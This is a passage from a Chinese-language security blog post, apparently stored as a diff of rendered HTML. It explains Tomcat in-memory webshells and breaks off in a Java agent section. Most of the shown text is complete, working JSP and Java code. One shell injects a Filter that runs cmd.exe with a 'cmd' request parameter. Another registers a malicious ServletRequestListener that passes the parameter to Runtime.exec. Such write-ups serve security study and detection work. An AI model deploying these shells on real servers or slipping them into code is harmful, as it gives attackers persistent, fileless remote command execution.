class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;KpLi0rn&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>Listener 内存马的实现其实就是动态注册一个然后在其中编写恶意方法，这里我们需要弄清楚 <code>Tomcat</code> 中 <code>Listener</code> 的注册流程。</p>
+<p>简单编写一个 <code>Listener</code> 项目：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260405100020929.png" alt="image-20260405100020929"></p>
+<p>要实现一个 <code>Listener</code> 必须实现一个 <code>EventListener</code> 接口，可以发现有很多接口都继承于这个 <code>EventListener</code>，我们本质上还是需要找到每一个请求都会触发的 <code>Listener</code>，这里我们找到 <code>ServletRequestListener</code> 然后实现它的 <code>requestInitialized</code> 方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;DONE!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现正常出现了结果：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260405100516348.png" alt="image-20260405100516348"></p>
+<p>现在关键的在于，我们能不能动态获取到 <code>servletRequest</code> 这个对象，从而获取到传入的参数。但是和 <code>filter</code> 不同的点在于，<code>doFilter</code> 参数中就含有 <code>servletRequest</code> 和 <code>servletResponse</code> ，而这里它只提供了 <code>ServletRequestEvent</code> 类型的参数。</p>
+<h3 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h3><p>我们可以看到这个方法：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260405103845292.png" alt="image-20260405103845292"></p>
+<p>感觉比较靠谱，我们进来调试一下。</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260405104146938.png" alt="image-20260405104146938"></p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260405104047629.png" alt="image-20260405104047629"></p>
+<p>其实就是这个类 <code>org.apache.catalina.connector.RequestFacade</code>，它的 <code>Request</code> 变量里就有我们需要的东西，我们反射拿一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;DONE!!!&quot;</span>);</span><br><span class="line">        org.apache.catalina.connector.<span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>).getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);</span><br><span class="line">            System.out.println(request);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那直接 RCE 就行了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line"></span><br><span class="line">        String cmd;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cmd = sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            org.apache.catalina.connector.<span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>).getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);</span><br><span class="line">            <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">while</span> ((i=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,i));</span><br><span class="line">                    response.getWriter().write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注册流程分析：</strong></p>
+<p>我们打断点调试一下，跟进 <code>StandardContext#listenerStart</code> 方法：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260405105114942.png" alt="image-20260405105114942"></p>
+<p>这里就是根据 Listener 文字值来进行实例化的：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260405105203954.png" alt="image-20260405105203954"></p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260405105615504.png" alt="image-20260405105615504"></p>
+<p>看一下这个函数：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260405105938066.png" alt="image-20260405105938066"></p>
+<p>Listener 的名字就是放在这个数组里的，载入的方式就是从 <code>web.xml</code> 静态加载的，我们更关心动态加载。下面就是遍历 <code>result</code> 分类并加入到 <code>eventListeners</code> 数组中：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260405110549689.png" alt="image-20260405110549689"></p>
+<p>这里还会调用 <code>getApplicationEventListeners</code> 方法再获取一次，然后调用 <code>setApplicationEventListeners</code> 设置 <code>Listener</code>，</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260405110823389.png" alt="image-20260405110823389"></p>
+<p>这个函数感觉就是在套娃，就是相当于赋值：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260405111011172.png" alt="image-20260405111011172"></p>
+<p>这里就相当于存入了</p>
+<p><strong>触发流程分析</strong>：</p>
+<p>刚才说了实例化的 <code>Listener</code> 已经被存入 <code>applicationEventListenersList </code> 中了，下面分析触发的流程。</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260405111259428.png" alt="image-20260405111259428"></p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260405111400430.png" alt="image-20260405111400430"></p>
+<p>跟一下栈，很容易就发现就在这个函数中遍历了 <code>applicationEventListenersList</code> 数组，然后调用了每个 <code>listener</code> 实例的 <code>requestInitialized</code> 方法。</p>
+<h3 id="内存马编写-1"><a href="#内存马编写-1" class="headerlink" title="内存马编写"></a>内存马编写</h3><p>我们先调用 <code>getApplicationEventListeners</code> 方法将 <code>applicationEventListenersList</code> 取出来，然后将我们构造好的恶意 listener 添加进去就可以了，至于 <code>context</code> 的获取方法在 filter 类内存马中说过这里不再赘述。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Arrays&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ListenerMemShell</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            String cmd;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                cmd = sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                org.apache.catalina.connector.<span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>).getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);</span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="keyword">while</span> ((i=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">                        response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,i));</span><br><span class="line">                        response.getWriter().write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class="line">    List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class="line">    List&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(listeners);</span><br><span class="line">    arrayList.add(<span class="keyword">new</span> <span class="title class_">ListenerMemShell</span>());</span><br><span class="line">    standardContext.setApplicationEventListeners(arrayList.toArray());</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Java-agent-内存马"><a href="#Java-agent-内存马" class="headerlink" title="Java agent &amp; 内存马"></a>Java agent &amp; 内存马</h2><h3 id="Java-agent-简介"><a href="#Java-agent-简介" class="headerlink" title="Java agent 简介"></a>Java agent 简介</h3><p>javaagent 是一种附加技术，它能够允许 JVM 在加载某个 class 文件之前对其字节码进行修改，同时也支持对已加载的 class 继续宁重新加载（<code>Retransform</code>）。</p>
+<p>一个 java agent 实现下面两种任一方法：</p>
+<ul>
+<li>实现 <code>premain</code> 方法，在 JVM 启动前加载</li>
+<li>实现 <code>agentmain</code> 方法，在 JVM 启动后加载</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">    